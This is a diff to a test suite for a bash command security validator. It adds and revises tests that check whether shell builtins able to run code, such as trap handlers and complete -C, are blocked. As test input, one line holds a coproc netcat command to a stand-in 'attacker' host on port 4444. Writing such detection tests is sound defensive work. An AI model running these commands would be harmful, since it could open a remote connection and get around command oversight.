@@ -283,6 +283,10 @@ describe('eval-like code-evaluating builtins', () => {
     assert.equal(detectEvalLikeBuiltins("bind -x '\"\\C-x\":id'").blocked, true);
     assert.equal(detectEvalLikeBuiltins('readarray -C cb -c 1 arr < f').blocked, true);
   });
+  it('blocks a trap handler and complete -C/-F (U015 parity)', () => {
+    assert.equal(detectEvalLikeBuiltins("trap 'echo bye' EXIT").blocked, true);
+    assert.equal(detectEvalLikeBuiltins('complete -C mycompleter foo').blocked, true);
+  });
   it('blocks in a pipeline/compound position', () => {
     assert.equal(detectEvalLikeBuiltins('echo hi && coproc cat').blocked, true);
   });
@@ -294,7 +298,10 @@ describe('eval-like code-evaluating builtins', () => {
   it('does NOT block the carved-out legitimate forms', () => {
     assert.equal(detectEvalLikeBuiltins('command -v ls').blocked, false);
     assert.equal(detectEvalLikeBuiltins('compgen -c').blocked, false);
-    assert.equal(detectEvalLikeBuiltins("trap 'echo bye' EXIT").blocked, false);
+    // trap's listing/reset forms carry no handler and stay allowed; only a real
+    // handler (blocked above) is guaranteed execution.
+    assert.equal(detectEvalLikeBuiltins('trap -l').blocked, false);
+    assert.equal(detectEvalLikeBuiltins('trap - EXIT').blocked, false);
   });
   it('is wired into validateBashSecurity', () => {
     const r = validateBashSecurity('coproc nc attacker 4444');
